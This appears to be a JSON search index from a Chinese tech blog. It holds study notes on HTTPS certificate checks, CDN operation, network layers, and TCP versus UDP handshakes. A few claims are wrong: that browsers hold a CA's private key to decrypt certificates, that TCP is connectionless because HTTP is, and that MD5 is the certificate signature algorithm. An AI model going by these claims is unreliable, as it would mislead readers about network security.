中心应尽量确认申请者的身份，并确保颁发的服务器证书确实是由该域名使用的。至于CA中心的具体实现上，就是在创建一个新的 HTTPS 连接时，浏览器端收到服务器的签名公钥，验证签名后（除非 CA 的私钥泄漏，否则签名无法被伪造），检查证书里被签名的 cn 项（Common Name，常用名称）或 subjectAltName 项的值，由此确认对方确实是浏览器真正要访问的服务器，并确认该公钥不在 CA 机构的公开撤销列表里（例如，证书是假冒或欺诈手段获取到的）。如果所有检查都通过了，浏览器就可以用这个公钥加密信息并传回给服务器端，通过这种方式，确认只有特定的接收者才能对加密信息进行解密。 SSL 证书是 CA 中心用自己 私钥 对申请者的信息进行加密的数据，当用户访问服务器是 SSL 证书从服务器下载到本地，然后浏览器内置了权威的 CA 中心的 私钥，用此 私钥 解密 SSL 证书中的数据，如果客户端计算出来的证书编号（使用证书中的 签名算法 进行计算）与证书中的证书编号相同，则验证通过。 SSL 证书包含的具体内容如下： Version 版本 Serial Number序列号 Algorithm ID 算法标识 Issuer 颁发者 Validity 有效期 Not Before 有效起始日期 Not After 有效终止日期 Subject 使用者 Subject Public Key Info 使用者公钥信息 Public Key Algorithm公钥算法 Subject Public Key公钥 Issuer Unique Identifier (Optional) 颁发者唯一标识（CA 中心） Subject Unique Identifier (Optional) 使用者唯一标识 Extensions (Optional) 扩展 … Certificate Signature Algorithm 证书签名算法（MD5 算法） Certificate Signature 证书签名 验证步骤： 首先浏览器读取证书中的证书所有者、有效期等信息进行一一校验 浏览器开始查找操作系统中已内置的受信任的证书发布机构 CA，与服务器发来的证书中的颁发者 CA 比对，用于校验证书是否为合法机构颁发 如果找不到，浏览器就会报错，说明服务器发来的证书是不可信任的。 如果找到，那么浏览器就会从操作系统中取出颁发者 CA 的公钥，然后对服务器发来的证书里面的签名进行解密 浏览器使用相同的 hash 算法计算出服务器发来的证书的 hash 值，将这个计算的 hash 值与证书中签名做对比 对比结果一致，则证明服务器发来的证书合法，没有被冒充 此时浏览器就可以读取证书中的公钥，用于后续加密了 认证信息 —哈希算法—&gt; 摘要 —私钥加密—&gt; 数字签名 6、HTTPS 的特点HTTPS 优点 所有信息都是加密传播，黑客无法窃听 具有校验机制，一旦被篡改，通信双方会立刻发现 配备身份证书，防止身份被冒充 HTTPS 缺点 SSL 证书费用很高，以及其在服务器上的部署、更新维护非常繁琐 HTTPS 降低用户访问速度（多次握手） 网站改用 HTTPS 以后，由HTTP 跳转到 HTTPS 的方式增加了用户访问耗时（多数网站采用 302 跳转） HTTPS 涉及到的安全算法会消耗 CPU 资源，需要增加大量机器（https 访问过程需要加解密）","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]},{"title":"CDN","slug":"HTTP/CDN","date":"2021-01-14T07:38:00.000Z","updated":"2021-04-30T07:19:28.147Z","comments":true,"path":"2021/01/14/HTTP/CDN/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/CDN/","excerpt":"","text":"CDN1. 基本原理CDN 是将源站内容分发至最接近用户的节点，使用户可就近取得所需内容，提高用户访问的响应速度和成功率。解决因分布、带宽、服务器性能带来的访问延迟问题，适用于站点加速、点播、直播等场景。 最简单的CDN 网络由一个 DNS 服务器和几台缓存服务器组成： 当用户点击网站页面上的内容URL，经过本地 DNS 系统解析， DNS 系统会最终将域名的解析权交给CNAME指向的CDN 专用 DNS 服务器。 CDN 的 DNS 服务器将CDN 的全局负载均衡设备 IP 地址返回用户。 用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求。 CDN 全局负载均衡设备根据用户IP地址，以及用户请求的内容URL，选择一台用户所属区域的区域负载均衡设备，告诉用户向这台设备发起请求。 区域负载均衡设备会为用户选择一台合适的缓存服务器提供服务，选择的依据包括：根据用户IP地址，判断哪一台服务器距用户最近；根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容；查询各个服务器当前的负载情况，判断哪一台服务器尚有服务能力。基于以上这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的 IP 地址。 全局负载均衡设备把服务器的IP地址返回给用户。 用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，而区域均衡设备依然将它分配给了用户，那么这台服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。 2. 优点 实现跨运营商、跨地域的全网覆盖 保障网站安全、增强可靠性，防止网络攻击 异地备份 节约成本投入（人力、财力） 当网站更新时，如果 CDN 节点上数据没有及时更新，即便用户再浏览器使用 Ctrl +F5 的方式使浏览器端的缓存失效，也会因为 CDN 边缘节点没有同步最新数据而导致用户访问异常 3. 应用场景 网站站点/应用加速 视音频点播/大文件下载分发加速 移动应用加速 CDN 执行响应的基本流程：用户的请求到达边缘服务器时，如果发现可用的缓存，则直接以缓存的内容响应，称为命中缓存，否则，请求将在 CDN 内部上行，直到命中合适的缓存或抵达内容网站自有的服务器，由其进行响应，称为回源，源服务器 处理完回源请求后，其响应将循原路返回，途中，CDN 各级节点将按照约定的方式对其进行缓存，以备下次使用。这是 。 4. 常见操作4.1 CDN 回源常规的 CDN 都是回源的。即当有用户访问某一个 URL 的时候，如果被解析到的那个 CDN 节点没有缓存响应的内容，或者是缓存已经到期，就会回源站去获取。如果没有人访问，那么 CDN 节点不会主动去源站拿的。 源站内容有更新的时候，源站主动把内容推送到 CDN 节点 4.2 缓存刷新缓存刷新是指淘汰 CDN 节点上的旧文件，重新获取文件的新版本 CDN 节点缓存的资源没有过期，但是基于客户的业务要求，需要更新CDN节点上缓存资源，刷新就是强制删除CDN节点缓存内容。用户请求这些资源时，CDN 节点需要重新回源拉取资源，保证响应的资源与源站一致。 刷新类型分为目录刷新和URL刷新。URL刷新是直接将节点上缓存的资源删除。对于目录刷新，会将节点上的文件资源过期，会同源站对比 Last-Modified 时间 4.3 缓存预热缓存预热是指首次发布的文件，主动从源站推送到 CDN，让用户访问到 CDN 时不用回客户的源站命中。 正常情况下，首批下载的用户体验很差，因为都集中访问源站主机，源站主机的CPU利用率和带宽会跑的很高。第一批用户下载完成后，CDN 中也能够缓存了一份，第二批用户下载就直接在 CDN 中命中，速度比第一批快得多 通过预热功能，将资源从源站推送到各 CDN 节点，提前先缓存起来。等正式使用时第一批用户也能从 CDN 中快速获取到资源 5. 常见名称A记录：是用来指定主机名（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的 web server 上。 CNAME记录：即：别名记录，这种记录允许您将多个名字映射到另外一个域名。 Origin Server：即源站，是 CDN 之前的客户真正的服务器。 CDN 节点：也称作边缘节点、Cache节点等，是相对于网络的复杂结构而提出的一个概念，指距离最终用户接入具有较少的中间环节的网络节点，对最终接入用户有较好的响应能力和连接速度。其作用是将访问量较大的网页内容和对象保存在服务器前端的专用cache设备上，以此来提高网站访问的速度和质量。 用户向浏览器提供要访问的域名，浏览器对域名进行解析，由于 CDN 参与后，对域名解析过程进行了调整，解析的结果不再一个IP地址，而是该域名对应的 CNAME 。但 CNAME 无法完成最终内容的获取，所以，浏览器需要再次对获得的 CNAME 进行解析，以得到实际的 IP 地址。在此过程中，CDN会根据用户的实际地理位置信息解析对应的 IP 地址，使得用户能就近访问。这个过程中， CNAME的主要作用是配合CDN的负载均衡系统将CNAME背后对应的节点IP分配给不同的用户去访问。","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]},{"title":"TCP/IP 协议","slug":"HTTP/TCP-IP 协议","date":"2021-01-14T07:34:00.000Z","updated":"2021-04-30T07:23:28.326Z","comments":true,"path":"2021/01/14/HTTP/TCP-IP 协议/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/TCP-IP%20%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"TCP/IP 协议网络七层模型，从上至下依次为： 应用层 ：为特定应用程序提供数据传输服务，例如 HTTP、DNS 等。数据单位为报文。 表示层 ：数据压缩、加密以及数据描述，这使得应用程序不必关心在各台主机中数据内部格式不同的问题。 会话层 ：建立及管理会话。 传输层 ：为进程提供通用数据传输服务。由于应用层协议很多，定义通用的传输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供完整性服务，UDP 主要提供及时性服务。 网络层 ：为主机提供数据传输服务。而传输层协议是为主机中的进程提供数据传输服务。网络层把传输层传递下来的报文段或者用户数据报封装成分组。 数据链路层 ：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的主机提供数据传输服务。数据链路层把网络层传下来的分组封装成帧。 物理层 ：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]},{"title":"TCP 与 UDP","slug":"HTTP/TCP  与 UDP","date":"2021-01-14T07:32:00.000Z","updated":"2021-04-30T07:12:05.005Z","comments":true,"path":"2021/01/14/HTTP/TCP  与 UDP/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/TCP%20%20%E4%B8%8E%20UDP/","excerpt":"","text":"TCP 与 UDP当 IP 包通过路由将数据传输到目的地时，会根据 TCP 或 UDP 包头中的源端口和目的端口信息，请求和获取不同的应用。也就是说，不管 TCP 还是 UDP，都含有网络服务必须的源端口和目的端口信息，以建立和实现网络传输服务。 在网络中，有些服务，如 HTTP、FTP 等，对数据的可靠性要求较高，在使用这些服务时，必须保证数据包能够完整无误的送达；而另外一些服务，如 DNS、即时聊天工具等，并不需要这么高的可靠性，高效率和实时性才是它们所关心的。根据这两种服务不同的需求，也就诞生了面向连接的 TCP 协议，以及面向无连接的 UDP 协议。 怎么理解 TCP 的面向连接和 UDP 的无连接（不面向连接）？TCP 关心分组是否准确送达，甚至仔细到给每个分组编号并收到目的端的确认才继续发送后续的分组，而 UDP 则不然，它只负责把分组封装好后直接发送到链路上，至于目的端收到与否并不关心。 TCP 的面向连接指对话之前需要先建立一个会话，而 UDP 无连接直接发送消息（类似于打电话和写信） UDP 和 TCP 的特点 用户数据报协议 UDP（User Datagram Protocol）是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、一对多、多对一和多对多的交互通信。 传输控制协议 TCP（Transmission Control Protocol）是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是点对点的（一对一）。 TCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够确认数据最终是否送达到对方 一、UDPUDP（User Data Protocol，用户数据报协议）是一种无连接的协议，提供面向事务的简单不可靠信息传送服务。UDP 协议的主要作用是将网络数据流量压缩成数据包的形式。一个典型的数据包就是一个二进制数据的传输单位，每一个数据包的前 8 个字节用来包含报头信息，剩余字节则用来包含具体的传输数据。 面向报文UDP 是一个面向报文（报文可以理解为一段段的数据）的协议。意思就是 UDP 只是报文的搬运工，不会对报文进行任何拆分和拼接操作。 具体来说 在发送端，应用层将数据传递给传输层的 UDP 协议，UDP 只会给数据增加一个 UDP 头标识下是 UDP 协议，然后就传递给网络层了 在接收端，网络层将数据传递给传输层，UDP 只去除 IP 报文头就传递给应用层，不会任何拼接操作 不可靠性 UDP 是无连接的，也就是说通信不需要建立和断开连接。 UDP 也是不可靠的。协议收到什么数据就传递什么数据，并且也不会备份数据，对方能不能收到是不关心的 UDP 没有拥塞控制，一直会以恒定的速度发送数据。即使网络条件不好，也不会对发送速率进行调整。这样实现的弊端就是在网络条件不好的情况下可能会导致丢包，但是优点也很明显，在某些实时性要求高的场景（比如电话会议）就需要使用 UDP 而不是 TCP。 高效因为 UDP 没有 TCP 那么复杂，需要保证数据不丢失且有序到达。所以 UDP 的头部开销小，只有八字节，相比 TCP 的至少二十字节要少得多，在传输数据报文时是很高效的。 头部包含了以下几个数据 两个十六位的端口号，分别为源端口（可选字段）和目标端口 整个数据报文的长度 整个数据报文的检验和（IPv4 可选 字段），该字段用于发现头部信息和数据中的错误 传输方式UDP 不止支持一对一的传输方式，同样支持一对多，多对多，多对一的方式，也就是说 UDP 提供了单播，多播，广播的功能。 特点 UDP 是一个非连接的协议，传输数据之前源端和终端不建立连接，当它想传送时就简单地去抓取来自应用程序的数据，并尽可能快地把它扔到网络上。在发送端，UDP传送数据的速度仅仅是受应用程序生成数据的速度、计算机的能力和传输带宽的限制；在接收端，UDP把每个消息段放在队列中，应用程序每次从队列中读一个消息段。 由于传输数据不建立连接，因此也就不需要维护连接状态，包括收发状态等，因此一台服务机可同时向多个客户机传输相同的消息。 UDP 信息包的标题很短，只有8个字节，相对于 TCP 的 20 个字节信息包的额外开销很小。 吞吐量不受拥挤控制算法的调节，只受应用软件生成数据的速率、传输带宽、源端和终端主机性能的限制。 UDP 使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的链接状态表（这里面有许多参数）。 UDP 是面向报文的。发送方的UDP对应用程序交下来的报文，在添加首部后就向下交付给IP层。既不拆分，也不合并，而是保留这些报文的边界，因此，应用程序需要选择合适的报文大小。 UDP 主要用在实时性要求高以及对质量相对较弱的地方，如流媒体、实时消息 二、TCPTCP（Transmission Control Protocol，传输控制协议） TCP（Transmission Control Protocol，传输控制协议）是面向连接的协议，即在收发数据前，必须和对方建立可靠的连接。TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接： 头部对于 TCP 头部来说，以下几个字段是很重要的 Sequence Number，(顺序号码)这个序号保证了 TCP 传输的报文都是有序的，对端可以通过序号顺序的拼接报文 Acknowledgement Number，(确认号码)这个序号表示数据接收端期望接收的下一个字节的编号是多少，同时也表示上一个序号的数据已经收到 Window Size，窗口大小，表示还能接收多少字节的数据，用于流量控制 标识符 URG=1：(urgent 紧急) 该字段为一表示本数据报的数据部分包含紧急信息，是一个高优先级数据报文，此时紧急指针有效。紧急数据一定位于当前数据包数据部分的最前面，紧急指针标明了紧急数据的尾部。 ACK=1：(acknowledgement 确认)该字段为一表示确认号字段有效。此外，TCP 还规定在连接建立后传送的所有报文段都必须把 ACK 置为一。 PSH=1：(push 传送)该字段为一表示接收端应该立即将数据 push 给应用层，而不是等到缓冲区满后再提交。 RST=1：(reset 重置)该字段为一表示当前 TCP 连接出现严重问题，可能需要重新建立 TCP 连接，也可以用于拒绝非法的报文段和拒绝连接请求。 SYN=1：(synchronous 建立联机) 当SYN=1，ACK=0时，表示当前报文段是一个连接请求报文。当SYN=1，ACK=1时，表示当前报文段是一个同意建立连接的应答报文。 FIN=1：(finish 结束)该字段为一表示此报文段是一个释放连接的请求报文。 状态机HTTP 是无连接的，所以作为下层的 TCP 协议也是无连接的，虽然看似 TCP 将两端连接了起来，但是其实只是两端共同维护了一个状态 LISTEN - 侦听来自远方 TCP 端口的连接请求；SYN-SENT -在发送连接请求后等待匹配的连接请求；SYN-RECEIVED - 在收到和发送一个连接请求后等待对连接请求的确认；ESTABLISHED- 代表一个打开的连接，数据可以传送给用户；FIN-WAIT-1 - 等待远程 TCP 的连接中断请求，或先前的连接中断请求的确认；FIN-WAIT-2 - 从远程 TCP 等待连接中断请求；CLOSE-WAIT - 等待从本地用户发来的连接中断请求；CLOSING -等待远程 TCP 对连接中断的确认；LAST-ACK - 等待原来发向远程 TCP 的连接中断请求的确认；TIME-WAIT -等待足够的时间以确保远程 TCP 接收到连接中断请求的确认；CLOSED - 没有任何连接状态； 建立连接（三次握手）在 TCP 协议中，主动发起请求的一端为客户端，被动连接的一端称为服务端。不管是客户端还是服务端，TCP 连接建立完后都能发送和接收数据，所以 TCP 也是一个全双工的协议。 第一次握手：主机A发送位码为syn＝1，随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机，A进入 SYN_SEND状态，等待主机B确认； 第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1)，syn=1，ack=1，随机产生seq=7654321的包，此时主机B进入SYN_RECV状态。； 第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1，以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1)，ack=1，主机B收到后确认seq值与ack=1则连接建立成功。此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。 两支军队，分别由两个将军领导，正在准备攻击一个坚固的城市。两支军队都驻扎在城市旁边的两个不同的山谷里。两军之间隔着第三个山谷，两个将军想要通讯的唯一方法就是穿过第三个山谷传送信件。问题是，第三个山谷被城市的守卫军占据，并且经此传送的信件可能会被守卫军截获。 第一次握手：A蓝数据成功到达B蓝，B蓝收到A蓝的通知“你准备好攻打红色部队了吗？” 第二次握手：B蓝回复A蓝，“我准备好了！”。 假设回复成功到达A蓝，但是此时B蓝并不知道A蓝是否成功收到了它的回复，因此它并不敢轻举妄动，假设A蓝并没有收到回复，没有出兵，那B蓝岂不是会全军覆没。于是很有必要进行第三次握手。 第三次握手：A蓝回复B蓝，“我知道你准备好了，开打吧！” 当B蓝收到这个确认之后，就可以开始出兵了。理论上来说，两军的沟通永远停不下来，因为没有办法确认最后一次数据包是否成功到达对方，所以三次握手也并不是绝对的可靠，可以选择四次，甚至多次握手，但是考虑到开销，选择三次握手，能保证足够的可靠性了。 断开连接（四次挥手）由于 TCP 连接是全双工的，因此每个方向都必须单独进行关闭。这个原则是当一方完成它的数据发送任务后就能发送一个 FIN 来终止这个方向的连接。收到一个 FIN 只意味着这一方向上没有数据流动，一个 TCP 连接在收到一个 FIN 后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。 TCP的连接的拆除需要发送四个包，因此称为四次挥手(four-way handshake)。客户端或服务器均可主动发起挥手动作，在 socket 编程中，任何一方执行 close() 操作即可产生挥手操作。 客户端A发送一个FIN，用来关闭客户A到服务器B的数据传送。 服务器B收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号。 服务器B关闭与客户端A的连接，发送一个FIN给客户端A。 客户端A发回ACK报文确认，并将确认序号设置为收到序号加1。","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]}],"categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"},{"name":"杂项","slug":"杂项","permalink":"https://xuxb.github.io/categories/%E6%9D%82%E9%A1%B9/"},{"name":"浏览器","slug":"浏览器","permalink":"https://xuxb.github.io/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"},{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"},{"name":"SVG","slug":"SVG","permalink":"https://xuxb.github.io/categories/SVG/"},{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/categories/CSS/"},{"name":"Sass","slug":"CSS/Sass","permalink":"https://xuxb.github.io/categories/CSS/Sass/"},{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"},{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"},{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JavaScript 基础","slug":"JavaScript-基础","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%9F%BA%E7%A1%80/"},{"name":"JSONP","slug":"JSONP","permalink":"https://xuxb.github.io/tags/JSONP/"},{"name":"同源策略","slug":"同源策略","permalink":"https://xuxb.github.io/tags/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"name":"JavaScript 原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"},{"name":"server","slug":"server","permalink":"https://xuxb.github.io/tags/server/"},{"name":"nginx","slug":"nginx","permalink":"https://xuxb.github.io/tags/nginx/"},{"name":"Performance","slug":"Performance","permalink":"https://xuxb.github.io/tags/Performance/"},{"name":"性能","slug":"性能","permalink":"https://xuxb.github.io/tags/%E6%80%A7%E8%83%BD/"},{"name":"node","slug":"node","permalink":"https://xuxb.github.io/tags/node/"},{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"},{"name":"SVG","slug":"SVG","permalink":"https://xuxb.github.io/tags/SVG/"},{"name":"CSS","slug":"CSS","permalink":"https://xuxb.github.io/tags/CSS/"},{"name":"Sass","slug":"Sass","permalink":"https://xuxb.github.io/tags/Sass/"},{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"},{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"},{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"},{"name":"cookie","slug":"cookie","permalink":"https://xuxb.github.io/tags/cookie/"}]}